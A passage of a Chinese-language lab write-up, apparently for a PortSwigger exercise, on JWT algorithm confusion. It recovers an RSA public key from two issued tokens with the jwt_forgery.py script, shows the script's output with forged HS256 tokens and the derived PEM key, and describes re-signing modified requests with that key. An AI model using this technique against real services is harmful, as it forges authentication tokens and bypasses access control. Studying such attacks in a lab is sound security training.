### 无法获取公钥就推测公钥

如果公钥集没有公开，可以使用脚本推测公钥：

如果服务器使用同一个密钥对多次给用户生成 jwt ，那么用户可使用 jwt_forgery.py  脚本推测公钥。

至于如何计算的，就属于我的知识盲区了。

第一次颁发给用户的 jwt：

```
eyJraWQiOiIxODM0N2JlOC02OGZkLTRiYWUtOTEzMi0yYzZlYTI2NTMxNGQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0OTExNTIzMCwic3ViIjoid2llbmVyIn0.B_1Owlfmbk406kmfQPV2jcYTvG8hzAi_sJvkzXvkqo8iObI9KBBq5JeFVj6USkMAc6o5oJGo8nqvsOsi4rjFqtRqj9a7SEiKoKZz8SvsSFMbNS3_lepp3z0me0619Iy3f03iG_YPnDB94vPEACVDNlVAcy8oUtoNsVxXbC7lydkpcD8wlS2Np-BkgxlSe-jzjQsfhZ-vNe2vAEewoYUvSz6TAnGOGVajB1nrjfJndBM4jRSu_pWJLgkQzTvHfUbdDEn5ORD28HLm6H6X3jmOCvf5fqAoZJtf_ECUln27hOOoBNumWblAEqOxPLUWe6oyo8X6roRLkVl2pCW-em134A
```

第二次颁发给用户的 jwt：

```
eyJraWQiOiIxODM0N2JlOC02OGZkLTRiYWUtOTEzMi0yYzZlYTI2NTMxNGQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0OTExNTMyNSwic3ViIjoid2llbmVyIn0.XxF20As_HCpGaMY7e6JpaNlCDXj8BkNxDcKoadvC3HYxDHM6qWBgTnQR6QGHjpBKKDNaCD7B3KXJSCSSiGPY89Ee4WYvZOO-dlVZOQ6_g1Kk0mk5GKI000Ya45B-qRWd6wgWg-uuLmZ9NW7Sld3xBtVPmcu9SOxtw41pXWuNNcg4KupphuWza5DI-GVquK5qQ26Uxcy90Ion2wZgdWmWmL3TyKN-blCeCaLokFK4CG1LwNUvDE1DXIqB6LhnYRvNQ-3f4ZN6CJQnccV190NPHBb8H3C8jPjKW-CtqPALTFN7lt2mNaBKdUmW2hz_Kj_FysES1uVq2Rn5sUy3UeNnkg
```

第一次和第二次使用了相同的密钥对，因为 kid 相同：

![image-20250605164911337](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/JWT%20%E6%BC%8F%E6%B4%9E/images/image-20250605164911337.png)

python：

```
python jwt_forgery.py eyJraWQiOiIxODM0N2JlOC02OGZkLTRiYWUtOTEzMi0yYzZlYTI2NTMxNGQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0OTExNTIzMCwic3ViIjoid2llbmVyIn0.B_1Owlfmbk406kmfQPV2jcYTvG8hzAi_sJvkzXvkqo8iObI9KBBq5JeFVj6USkMAc6o5oJGo8nqvsOsi4rjFqtRqj9a7SEiKoKZz8SvsSFMbNS3_lepp3z0me0619Iy3f03iG_YPnDB94vPEACVDNlVAcy8oUtoNsVxXbC7lydkpcD8wlS2Np-BkgxlSe-jzjQsfhZ-vNe2vAEewoYUvSz6TAnGOGVajB1nrjfJndBM4jRSu_pWJLgkQzTvHfUbdDEn5ORD28HLm6H6X3jmOCvf5fqAoZJtf_ECUln27hOOoBNumWblAEqOxPLUWe6oyo8X6roRLkVl2pCW-em134A eyJraWQiOiIxODM0N2JlOC02OGZkLTRiYWUtOTEzMi0yYzZlYTI2NTMxNGQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0OTExNTMyNSwic3ViIjoid2llbmVyIn0.XxF20As_HCpGaMY7e6JpaNlCDXj8BkNxDcKoadvC3HYxDHM6qWBgTnQR6QGHjpBKKDNaCD7B3KXJSCSSiGPY89Ee4WYvZOO-dlVZOQ6_g1Kk0mk5GKI000Ya45B-qRWd6wgWg-uuLmZ9NW7Sld3xBtVPmcu9SOxtw41pXWuNNcg4KupphuWza5DI-GVquK5qQ26Uxcy90Ion2wZgdWmWmL3TyKN-blCeCaLokFK4CG1LwNUvDE1DXIqB6LhnYRvNQ-3f4ZN6CJQnccV190NPHBb8H3C8jPjKW-CtqPALTFN7lt2mNaBKdUmW2hz_Kj_FysES1uVq2Rn5sUy3UeNnkg
```

输出：

```
[*] GCD:  0x1
[*] GCD:  0x8560b8da2bf42f4df2a1be3988989711f255dec15edd6b777d2fd63db845aae2b01de22551a1b3e3f6fb9da0f3c264563a8393e599f1392618ae49dcc93b668d2db8cc196ab65872fee037813406051f0f777382b69d8d64bf22a3a1f4e0ef12994c82d23a7bd12807034daa809f7a3edecd404c436cbb71a7716ef9cd54ce118240819da0717430dd9509a0d1656e2bdc7dfe274500533310fec92939e0a30c9ada12e106896693025b15428f80cdca51daccd21ee816641b07c217f2b0c621a38f607a63de8255db82f3e74381a1061b03a7b2ed15c96954952f547554bec5704a133fcf868c2a837bf3e6fde26d6fb9a165c14693dc99b78d7188d5c5f38d
[+] Found n with multiplier 1  :
 0x8560b8da2bf42f4df2a1be3988989711f255dec15edd6b777d2fd63db845aae2b01de22551a1b3e3f6fb9da0f3c264563a8393e599f1392618ae49dcc93b668d2db8cc196ab65872fee037813406051f0f777382b69d8d64bf22a3a1f4e0ef12994c82d23a7bd12807034daa809f7a3edecd404c436cbb71a7716ef9cd54ce118240819da0717430dd9509a0d1656e2bdc7dfe274500533310fec92939e0a30c9ada12e106896693025b15428f80cdca51daccd21ee816641b07c217f2b0c621a38f607a63de8255db82f3e74381a1061b03a7b2ed15c96954952f547554bec5704a133fcf868c2a837bf3e6fde26d6fb9a165c14693dc99b78d7188d5c5f38d
[+] Written to 8560b8da2bf42f4d_65537_x509.pem
[+] Tampered JWT: b'eyJraWQiOiIxODM0N2JlOC02OGZkLTRiYWUtOTEzMi0yYzZlYTI2NTMxNGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc0OTE5ODI5NiwgInN1YiI6ICJ3aWVuZXIifQ.wafQy_4lc0wbfCHoHWvIYpJ2ltk1lsG8AgI8_3Y43TI'
[+] Written to 8560b8da2bf42f4d_65537_pkcs1.pem
[+] Tampered JWT: b'eyJraWQiOiIxODM0N2JlOC02OGZkLTRiYWUtOTEzMi0yYzZlYTI2NTMxNGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc0OTE5ODI5NiwgInN1YiI6ICJ3aWVuZXIifQ.2VZlrNYc5sxx0Wp_KdV9Q_9QG6PhZVcLTXoy6Qcfvk4'
================================================================================
Here are your JWT's once again for your copypasting pleasure
================================================================================
eyJraWQiOiIxODM0N2JlOC02OGZkLTRiYWUtOTEzMi0yYzZlYTI2NTMxNGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc0OTE5ODI5NiwgInN1YiI6ICJ3aWVuZXIifQ.wafQy_4lc0wbfCHoHWvIYpJ2ltk1lsG8AgI8_3Y43TI
eyJraWQiOiIxODM0N2JlOC02OGZkLTRiYWUtOTEzMi0yYzZlYTI2NTMxNGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc0OTE5ODI5NiwgInN1YiI6ICJ3aWVuZXIifQ.2VZlrNYc5sxx0Wp_KdV9Q_9QG6PhZVcLTXoy6Qcfvk4
```

公钥如下：

![image-20250605162544571](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/JWT%20%E6%BC%8F%E6%B4%9E/images/image-20250605162544571.png)



```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhWC42iv0L03yob45iJiX
EfJV3sFe3Wt3fS/WPbhFquKwHeIlUaGz4/b7naDzwmRWOoOT5ZnxOSYYrkncyTtm
jS24zBlqtlhy/uA3gTQGBR8Pd3OCtp2NZL8io6H04O8SmUyC0jp70SgHA02qgJ96
Pt7NQExDbLtxp3Fu+c1UzhGCQIGdoHF0MN2VCaDRZW4r3H3+J0UAUzMQ/skpOeCj
DJraEuEGiWaTAlsVQo+AzcpR2szSHugWZBsHwhfysMYho49gemPeglXbgvPnQ4Gh
BhsDp7LtFclpVJUvVHVUvsVwShM/z4aMKoN78+b94m1vuaFlwUaT3Jm3jXGI1cXz
jQIDAQAB
-----END PUBLIC KEY-----

```

![image-20250605162703139](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/JWT%20%E6%BC%8F%E6%B4%9E/images/image-20250605162703139.png)

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFoV0M0Mml2MEwwM3lvYjQ1aUppWApFZkpWM3NGZTNXdDNmUy9XUGJoRnF1S3dIZUlsVWFHejQvYjduYUR6d21SV09vT1Q1Wm54T1NZWXJrbmN5VHRtCmpTMjR6QmxxdGxoeS91QTNnVFFHQlI4UGQzT0N0cDJOWkw4aW82SDA0TzhTbVV5QzBqcDcwU2dIQTAycWdKOTYKUHQ3TlFFeERiTHR4cDNGdStjMVV6aEdDUUlHZG9IRjBNTjJWQ2FEUlpXNHIzSDMrSjBVQVV6TVEvc2twT2VDagpESnJhRXVFR2lXYVRBbHNWUW8rQXpjcFIyc3pTSHVnV1pCc0h3aGZ5c01ZaG80OWdlbVBlZ2xYYmd2UG5RNEdoCkJoc0RwN0x0RmNscFZKVXZWSFZVdnNWd1NoTS96NGFNS29ONzgrYjk0bTF2dWFGbHdVYVQzSm0zalhHSTFjWHoKalFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```

新建一个对称密钥：

![image-20250605163219272](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/JWT%20%E6%BC%8F%E6%B4%9E/images/image-20250605163219272.png)

修改数据包，然后保持原有的 kid。

对称签下名。

![image-20250605163107354](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/JWT%20%E6%BC%8F%E6%B4%9E/images/image-20250605163107354.png)

